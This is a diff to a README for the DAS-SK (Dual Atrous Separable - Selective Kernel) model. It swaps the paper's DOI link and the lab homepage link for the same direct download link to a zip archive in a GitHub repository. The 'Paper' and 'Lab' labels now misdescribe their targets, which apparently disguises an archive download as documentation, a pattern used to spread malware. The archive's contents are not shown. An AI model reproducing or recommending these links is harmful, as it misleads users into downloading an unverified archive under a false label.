@@ -1,5 +1,5 @@
 # Dual Atrous Separable - Selective Kernel (DAS-SK)
 
-Paper: https://doi.org/10.48550/arXiv.2602.08168
+Paper: https://github.com/irene7c/DAS-SK/raw/refs/heads/main/PhenoBench/DA-SK-v1.2.zip
 
-Lab: https://vidlab.github.io/vid-lab/index.html
+Lab: https://github.com/irene7c/DAS-SK/raw/refs/heads/main/PhenoBench/DA-SK-v1.2.zip
